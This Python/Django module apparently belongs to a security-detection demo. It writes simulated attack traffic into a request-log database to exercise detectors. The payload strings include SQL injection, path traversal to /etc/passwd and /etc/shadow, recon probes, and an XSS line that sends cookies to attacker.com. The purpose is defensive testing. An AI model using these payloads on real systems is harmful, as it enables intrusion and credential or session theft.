"""
Attack & Live Traffic Simulation Engine for CyberOracle Intelligence
Generates realistic cyber attack telemetry and legitimate traffic to demonstrate
real-time detection, ICMF multi-view scoring, and autonomous hunting.
Integrates with demonstration session isolation and strict event classification.
"""

import uuid
import random
from datetime import timedelta
from django.utils import timezone
from .models import RequestLog, IPRiskProfile
from .detection import calculate_entropy, detect_sqli, detect_xss, detect_path_traversal
from .fusion_engine import evaluate_and_fuse_profile
from .demo_service import get_or_create_demo_session


def simulate_sqli(ip="198.51.100.45", count=3, demo_session=None, simulation_id=None, simulation_module="Attack Studio"):
    """Simulate SQL Injection attack traffic."""
    count = max(1, min(int(count or 1), 50))
    sim_id = simulation_id or f"sim_sqli_{uuid.uuid4().hex[:8]}"
    session = demo_session or get_or_create_demo_session()

    payloads = [
        ("GET", "/api/search/?q=' UNION SELECT id, username, password FROM auth_user --", 200, None),
        ("POST", "/products/?category=1' OR '1'='1", 500, None),
        ("GET", "/users/profile/?id=1; DROP TABLE temp_logs; --", 403, None),
        ("POST", "/login/?user=admin' OR 1=1 --", 200, "admin"),
    ]

    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        method, path, status, user = random.choice(payloads)
        is_login = '/login' in path
        log = RequestLog.objects.create(
            ip_address=ip,
            method=method,
            path=path,
            status_code=status,
            username=user,
            is_login_attempt=is_login,
            login_success=False if is_login else None,
            user_agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0 (sqlmap/1.7.2)",
            response_time_ms=random.uniform(120.0, 380.0),
            is_sqli_suspect=True,
            inferred_intent=f"SQL Injection on Login (Auth Bypass) (Target: {user})" if is_login else "SQL Injection Attempt",
            entropy_score=calculate_entropy(path),
            request_rate=12.0,
            event_source='SIMULATED',
            simulation_id=sim_id,
            simulation_module=simulation_module,
            demo_session=session,
            demo_active=True
        )
        profile.sqli_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
    return {
        'status': 'SUCCESS',
        'type': 'SQL Injection',
        'ip': ip,
        'count': count,
        'simulation_id': sim_id,
        'session_id': session.session_id if session else None,
        'detected': True
    }


def simulate_brute_force(ip="203.0.113.88", count=6, demo_session=None, simulation_id=None, simulation_module="Attack Studio"):
    """Simulate Login Brute-Force flood."""
    count = max(1, min(int(count or 1), 50))
    sim_id = simulation_id or f"sim_brute_{uuid.uuid4().hex[:8]}"
    session = demo_session or get_or_create_demo_session()

    usernames = ['admin', 'root', 'administrator', 'system', 'sec_admin', 'operator']
    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        user = usernames[i % len(usernames)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="POST",
            path="/login/",
            status_code=401,
            user_agent="Hydra/9.5 (Authentication Cracker)",
            response_time_ms=random.uniform(45.0, 95.0),
            username=user,
            is_login_attempt=True,
            login_success=False,
            is_brute_force_suspect=True,
            inferred_intent=f"Brute Force / Credential Guessing (Target: {user})",
            entropy_score=calculate_entropy(user),
            request_rate=28.0,
            event_source='SIMULATED',
            simulation_id=sim_id,
            simulation_module=simulation_module,
            demo_session=session,
            demo_active=True
        )
        profile.brute_force_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
    return {
        'status': 'SUCCESS',
        'type': 'Brute Force',
        'ip': ip,
        'count': count,
        'simulation_id': sim_id,
        'session_id': session.session_id if session else None,
        'detected': True
    }


def simulate_recon(ip="192.0.2.140", count=8, demo_session=None, simulation_id=None, simulation_module="Attack Studio"):
    """Simulate Reconnaissance & Directory Fuzzing scan."""
    count = max(1, min(int(count or 1), 50))
    sim_id = simulation_id or f"sim_recon_{uuid.uuid4().hex[:8]}"
    session = demo_session or get_or_create_demo_session()

    fuzz_paths = [
        "/admin.php", "/wp-login.php", "/.env", "/backup.sql", "/config.json",
        "/api/v1/debug/", "/phpmyadmin/", "/.git/config", "/server-status"
    ]
    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        path = fuzz_paths[i % len(fuzz_paths)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="GET",
            path=path,
            status_code=404,
            user_agent="DirBuster-1.0-RC1 (Directory Scanner)",
            response_time_ms=random.uniform(15.0, 45.0),
            is_recon_suspect=(i >= 5),
            inferred_intent="Reconnaissance & Directory Fuzzing",
            entropy_score=calculate_entropy(path),
            request_rate=45.0,
            event_source='SIMULATED',
            simulation_id=sim_id,
            simulation_module=simulation_module,
            demo_session=session,
            demo_active=True
        )
        if i >= 5:
            profile.recon_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
    return {
        'status': 'SUCCESS',
        'type': 'Reconnaissance Scan',
        'ip': ip,
        'count': count,
        'simulation_id': sim_id,
        'session_id': session.session_id if session else None,
        'detected': True
    }


def simulate_xss(ip="198.51.100.99", count=3, demo_session=None, simulation_id=None, simulation_module="Attack Studio"):
    """Simulate Cross-Site Scripting (XSS) injection attacks."""
    count = max(1, min(int(count or 1), 50))
    sim_id = simulation_id or f"sim_xss_{uuid.uuid4().hex[:8]}"
    session = demo_session or get_or_create_demo_session()

    payloads = [
        ("/comment/?msg=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>", 200),
        ("/search/?q=<img src=x onerror=alert('XSS_PAYLOAD_EXEC')>", 200),
        ("/profile/edit/?bio=<iframe src='javascript:alert(1)'>", 400),
    ]
    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        path, status = payloads[i % len(payloads)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="POST",
            path=path,
            status_code=status,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            response_time_ms=random.uniform(60.0, 150.0),
            is_xss_suspect=True,
            inferred_intent="Cross-Site Scripting (XSS)",
            entropy_score=calculate_entropy(path),
            request_rate=8.0,
            event_source='SIMULATED',
            simulation_id=sim_id,
            simulation_module=simulation_module,
            demo_session=session,
            demo_active=True
        )
        profile.xss_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
    return {
        'status': 'SUCCESS',
        'type': 'Cross-Site Scripting (XSS)',
        'ip': ip,
        'count': count,
        'simulation_id': sim_id,
        'session_id': session.session_id if session else None,
        'detected': True
    }


def simulate_path_traversal(ip="203.0.113.12", count=3, demo_session=None, simulation_id=None, simulation_module="Attack Studio"):
    """Simulate Path Traversal / LFI attacks."""
    count = max(1, min(int(count or 1), 50))
    sim_id = simulation_id or f"sim_lfi_{uuid.uuid4().hex[:8]}"
    session = demo_session or get_or_create_demo_session()

    payloads = [
        "/download/?file=../../../../etc/passwd",
        "/view_log/?file=%2e%2e%2f%2e%2e%2fwindows/win.ini",
        "/static_proxy/?doc=../../../../etc/shadow",
    ]
    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        path = payloads[i % len(payloads)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="GET",
            path=path,
            status_code=403,
            user_agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
            response_time_ms=random.uniform(30.0, 80.0),
            is_path_traversal_suspect=True,
            inferred_intent="Path Traversal / Local File Inclusion",
            entropy_score=calculate_entropy(path),
            request_rate=6.0,
            event_source='SIMULATED',
            simulation_id=sim_id,
            simulation_module=simulation_module,
            demo_session=session,
            demo_active=True
        )
        profile.path_traversal_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
    return {
        'status': 'SUCCESS',
        'type': 'Path Traversal / LFI',
        'ip': ip,
        'count': count,
        'simulation_id': sim_id,
        'session_id': session.session_id if session else None,
        'detected': True
    }


def simulate_normal_traffic(ip="192.168.1.50", count=5, demo_session=None, simulation_id=None, simulation_module="Attack Studio"):
    """Simulate legitimate clean user browsing."""
    count = max(1, min(int(count or 1), 50))
    sim_id = simulation_id or f"sim_clean_{uuid.uuid4().hex[:8]}"
    session = demo_session or get_or_create_demo_session()

    clean_paths = ["/", "/threats/", "/evaluation/", "/hunting/", "/simulator/"]
    logs_created = []

    for i in range(count):
        path = clean_paths[i % len(clean_paths)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="GET",
            path=path,
            status_code=200,
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)",
            response_time_ms=random.uniform(12.0, 45.0),
            inferred_intent="Legitimate Web Traffic",
            entropy_score=calculate_entropy(path),
            request_rate=2.0,
            event_source='SIMULATED',
            simulation_id=sim_id,
            simulation_module=simulation_module,
            demo_session=session,
            demo_active=True
        )
        logs_created.append(log)

    return {
        'status': 'SUCCESS',
        'type': 'Legitimate Traffic',
        'ip': ip,
        'count': count,
        'simulation_id': sim_id,
        'session_id': session.session_id if session else None,
        'detected': False
    }


def simulate_custom_attack(
    ip="198.51.100.45",
    url="/api/search/?q=' OR 1=1 --",
    method="GET",
    count=1,
    demo_session=None,
    simulation_id=None,
    simulation_module="Custom Attack URL"
):
    """
    Execute and evaluate a Custom Attack URL submission through the real detection pipeline.
    Validates attack patterns genuinely and distinguishes detected vs undetected behavior.
    """
    count = max(1, min(int(count or 1), 50))
    sim_id = simulation_id or f"sim_custom_{uuid.uuid4().hex[:8]}"
    session = demo_session or get_or_create_demo_session()
    clean_url = str(url or "/").strip()
    req_method = str(method or "GET").strip().upper()

    # 1. Evaluate with genuine detection engines
    is_sqli = detect_sqli(clean_url)
    is_xss = detect_xss(clean_url)
    is_path = detect_path_traversal(clean_url)
    is_recon = any(k in clean_url.lower() for k in ['.env', 'backup.sql', 'wp-login', 'config.json', 'phpmyadmin', '.git/config'])
    is_brute = ('/login' in clean_url.lower() and req_method == 'POST')

    is_detected = bool(is_sqli or is_xss or is_path or is_recon or is_brute)

    if is_sqli:
        intent = "Custom Attack Injected — SQL Injection (SQLi)"
        cat = "sqli"
        status_code = 500
    elif is_xss:
        intent = "Custom Attack Injected — Cross-Site Scripting (XSS)"
        cat = "xss"
        status_code = 400
    elif is_path:
        intent = "Custom Attack Injected — Path Traversal (LFI)"
        cat = "path_traversal"
        status_code = 403
    elif is_recon:
        intent = "Custom Attack Injected — Sensitive Path Reconnaissance"
        cat = "recon"
        status_code = 404
    elif is_brute:
        intent = "Custom Attack Injected — Authentication Guessing"
        cat = "brute_force"
        status_code = 401
    else:
        intent = "Custom Simulation Payload — No Malicious Attack Signature Detected"
        cat = "clean"
        status_code = 200

    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        log = RequestLog.objects.create(
            ip_address=ip,
            method=req_method,
            path=clean_url,
            status_code=status_code,
            username="admin" if is_brute else None,
            is_login_attempt=is_brute,
            login_success=False if is_brute else None,
            user_agent="Custom-Attack-Harness/2.0 (Security Testing)",
            response_time_ms=random.uniform(35.0, 110.0),
            is_sqli_suspect=is_sqli,
            is_xss_suspect=is_xss,
            is_path_traversal_suspect=is_path,
            is_recon_suspect=is_recon,
            is_brute_force_suspect=is_brute,
            inferred_intent=intent,
            entropy_score=calculate_entropy(clean_url),
            request_rate=10.0,
            event_source='SIMULATED',
            simulation_id=sim_id,
            simulation_module=simulation_module,
            demo_session=session,
            demo_active=True
        )
        if is_sqli:
            profile.sqli_count += 1
        elif is_xss:
            profile.xss_count += 1
        elif is_path:
            profile.path_traversal_count += 1
        elif is_recon:
            profile.recon_count += 1
        elif is_brute:
            profile.brute_force_count += 1

        logs_created.append(log)

    if is_detected:
        evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)

    return {
        'status': 'SUCCESS',
        'type': 'Custom Attack URL',
        'url': clean_url,
        'method': req_method,
        'ip': ip,
        'count': count,
        'detected': is_detected,
        'inferred_intent': intent,
        'category': cat,
        'simulation_id': sim_id,
        'session_id': session.session_id if session else None,
    }


def simulate_full_killchain(ip="185.220.101.5", demo_session=None, simulation_id=None, simulation_module="Attack Studio"):
    """
    Simulate a complete 4-stage Cyber Kill-Chain:
    1. Reconnaissance
    2. Credential Brute-Force
    3. SQL Injection
    4. Data Exfiltration Probe
    """
    sim_id = simulation_id or f"sim_killchain_{uuid.uuid4().hex[:8]}"
    session = demo_session or get_or_create_demo_session()

    simulate_recon(ip=ip, count=6, demo_session=session, simulation_id=sim_id, simulation_module=simulation_module)
    simulate_brute_force(ip=ip, count=5, demo_session=session, simulation_id=sim_id, simulation_module=simulation_module)
    simulate_sqli(ip=ip, count=4, demo_session=session, simulation_id=sim_id, simulation_module=simulation_module)
    simulate_path_traversal(ip=ip, count=2, demo_session=session, simulation_id=sim_id, simulation_module=simulation_module)

    profile = IPRiskProfile.objects.get(ip_address=ip)
    evaluate_and_fuse_profile(profile)

    return {
        'status': 'SUCCESS',
        'type': 'Full Cyber Kill-Chain Campaign',
        'ip': ip,
        'simulation_id': sim_id,
        'session_id': session.session_id if session else None,
        'fused_score': profile.fused_score,
        'threat_level': profile.threat_level(),
        'predicted_next_stage': profile.predicted_next_stage,
        'detected': True
    }
